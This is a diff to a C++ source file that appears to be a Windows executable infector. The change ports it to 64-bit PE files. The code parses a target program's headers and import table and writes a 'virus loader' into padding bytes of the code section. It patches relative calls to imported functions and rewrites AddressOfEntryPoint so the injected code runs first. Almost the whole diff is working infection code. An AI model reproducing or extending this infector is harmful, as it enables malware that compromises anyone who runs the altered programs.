@@ -7,6 +7,8 @@
 #include <vector>
 #include <map>
 
+typedef long long addr_t;
+
 #define CODE_SECTION_NAME ".text"
 #define IMPORT_DIRECTORY_SECTION ".rdata"
 #define RELATIVE_JUMP_INSTRUCTION 0xE9
@@ -17,31 +19,31 @@
 #define EMPTY_SECTION_MARGIN 0
 
 // map filled with needed extern functions
-std::map<std::string, std::map<std::string, long>> dllToFuncNameToAddress = {
+std::map<std::string, std::map<std::string, addr_t>> dllToFuncNameToAddress = {
     {
-        "USER32.dll", 
+        "KERNEL32.dll", 
         {
-            { "MessageBoxA", 0 },
+            { "GetLastError", 0 },
         }
     },
 };
 
 std::vector<std::pair<std::string, std::string>> externFunctionsToFill = {
-    { "USER32.dll", "MessageBoxA" },
+    { "KERNEL32.dll", "GetLastError" },
 };
 
 void analyzeEXE(const char* exePath);
 
-
 int main()
 {
-    std::string exePath = "../debug/ogNotepad - copy.exe";
+    std::string exePath = "../debug/notepad64 - copy.exe";
     // std::cout << "Enter exe path: ";
     // std::getline(std::cin, exePath);
     analyzeEXE(exePath.c_str());
 }
 
-void writeVirusLoader(FILE* exeFile, const char* virusLoaderPath, int codeSectionRawToVirtual)
+addr_t base;
+void writeVirusLoader(FILE* exeFile, const char* virusLoaderPath, addr_t codeSectionRawToVirtual)
 {
     FILE* virusLoader = fopen(virusLoaderPath, "r");
     if (!virusLoader)
@@ -54,7 +56,7 @@ void writeVirusLoader(FILE* exeFile, const char* virusLoaderPath, int codeSectio
     int callCounter = 0, callIndex = 0;    // 5 times 0xE8 in a row indicates an extern call (without a valid address)
     while (c != EOF)
     {
-        if (c == 0xff)
+        if (c == 0x33)
             callCounter++;
         else
             callCounter = 0;
@@ -62,11 +64,11 @@ void writeVirusLoader(FILE* exeFile, const char* virusLoaderPath, int codeSectio
         {
             fseek(exeFile, -3, SEEK_CUR);
             auto func = externFunctionsToFill[callIndex++];
-            long virtualDestination = dllToFuncNameToAddress[func.first][func.second];
-            long virtualSource = ftell(exeFile) + codeSectionRawToVirtual;
-            long relativeCall = virtualDestination - virtualSource - SIZEOF_REL32_CALL + 1;
-            printf("jump from 0x%X to 0x%X: 0x%X", virtualSource, virtualDestination, relativeCall);
-            fwrite(&virtualDestination, sizeof(unsigned int), 1, exeFile);
+            addr_t virtualDestination = dllToFuncNameToAddress[func.first][func.second];
+            addr_t virtualSource = (addr_t)ftell(exeFile) + codeSectionRawToVirtual + sizeof(DWORD);  // end of current instruction
+            int relativeCall = virtualDestination - virtualSource;
+            printf("jump from 0x%llX to 0x%llX: 0x%X", virtualSource, virtualDestination, relativeCall);
+            fwrite(&relativeCall, sizeof(int), 1, exeFile);
             c = fgetc(virusLoader);
             continue;
         }
@@ -94,7 +96,7 @@ void freadstr(FILE* file, char* buffer, long pos)
     fseek(file, startPos, SEEK_SET);
 }
 
-void getExternCallAddresses(FILE* file, int importDirectoryPos, int virtualRawOffset, int imageBase)
+void getExternCallAddresses(FILE* file, int importDirectoryPos, addr_t virtualRawOffset, addr_t imageBase)
 {
     char nameBuffer[1000] = { 0 };
 
@@ -115,19 +117,19 @@ void getExternCallAddresses(FILE* file, int importDirectoryPos, int virtualRawOf
         auto& funcToAddress = dllToFuncNameToAddress[nameBuffer];
 
         // go over all functions
-        IMAGE_THUNK_DATA ILT;
+        IMAGE_THUNK_DATA64 ILT;
         fseek(file, importDescriptor.FirstThunk + virtualRawOffset, SEEK_SET);
         long offset = 0;
         while (true)
         {
-            fread(&ILT, sizeof(IMAGE_THUNK_DATA), 1, file);
+            fread(&ILT, sizeof(IMAGE_THUNK_DATA64), 1, file);
             if ((ILT.u1.Ordinal & IMAGE_ORDINAL_FLAG) || !ILT.u1.AddressOfData)
                 break;
 
             freadstr(file, nameBuffer, ILT.u1.AddressOfData + offsetof(IMAGE_IMPORT_BY_NAME, Name) + virtualRawOffset);
             if (funcToAddress.find(nameBuffer) == funcToAddress.end())
             {
-                offset += sizeof(DWORD);
+                offset += sizeof(IMAGE_THUNK_DATA64);
                 continue;
             }
 
@@ -140,9 +142,9 @@ void analyzeEXE(const char* exePath)
 {
     IMAGE_DOS_HEADER dosHeader;
     IMAGE_FILE_HEADER fileHeader;
-    IMAGE_OPTIONAL_HEADER optHeader;
+    IMAGE_OPTIONAL_HEADER64 optHeader;
     IMAGE_SECTION_HEADER codeSectionHeader = { 0 }, currentSectionHeader;
-    int importDirVirtualToRaw = 0, codeSectionRawToVirtual = 0;
+    addr_t importDirVirtualToRaw = 0, codeSectionRawToVirtual = 0;
 
     FILE* file = fopen(exePath, "r+b");
     if (!file)
@@ -162,9 +164,12 @@ void analyzeEXE(const char* exePath)
     // jump and read file header, optional header
     fseek(file, dosHeader.e_lfanew + sizeof(DWORD), SEEK_SET);
     fread(&fileHeader, sizeof(IMAGE_FILE_HEADER), 1, file);
-    fread(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER), 1, file);
+    fread(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER64), 1, file);
 
-    fseek(file, fileHeader.SizeOfOptionalHeader - sizeof(IMAGE_OPTIONAL_HEADER), SEEK_CUR);
+    // TEMP
+    base = optHeader.ImageBase;
+
+    fseek(file, fileHeader.SizeOfOptionalHeader - sizeof(IMAGE_OPTIONAL_HEADER64), SEEK_CUR);
     // read section headers
     int sectionCount = 0;
     for (int i = 0; i < fileHeader.NumberOfSections; i++)
@@ -191,7 +196,7 @@ void analyzeEXE(const char* exePath)
     {
         unsigned char b;
         fread(&b, sizeof(unsigned char), 1, file);
-        if (b == 0)
+        if (b == 0xCC)
             size++;
         else
         {
@@ -205,7 +210,7 @@ void analyzeEXE(const char* exePath)
     }
     maxSize -= EMPTY_SECTION_MARGIN + SIZEOF_REL32_JUMP;
     printf("size: %d\n", maxSize);
-    int overwriteVirtual = codeSectionHeader.VirtualAddress - codeSectionHeader.PointerToRawData + overwriteRaw;
+    addr_t overwriteVirtual = codeSectionHeader.VirtualAddress - codeSectionHeader.PointerToRawData + overwriteRaw;
 
     // inject virus loading code
     fseek(file, overwriteRaw, SEEK_SET);
@@ -223,7 +228,7 @@ void analyzeEXE(const char* exePath)
     optHeader.AddressOfEntryPoint = overwriteVirtual;
     // rewrite updated opt header
     fseek(file, dosHeader.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER), SEEK_SET);
-    fwrite(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER), 1, file);
+    fwrite(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER64), 1, file);
     
     fclose(file);
 }
